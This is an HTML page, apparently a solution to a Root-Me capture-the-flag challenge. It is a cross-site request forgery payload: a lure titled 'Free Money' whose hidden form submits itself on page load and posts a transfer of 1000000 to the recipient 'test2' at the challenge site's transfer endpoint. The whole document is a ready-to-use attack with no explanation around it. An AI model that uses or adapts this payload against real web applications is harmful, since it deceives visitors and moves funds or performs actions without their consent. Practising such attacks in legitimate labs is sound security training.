<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Money</title>
</head>
<body>
    <h1>Claim your reward!</h1>
    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
        <input type="hidden" name="recipient" value="test2">
        <input type="hidden" name="amount" value="1000000">
    </form>
    <script>
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>
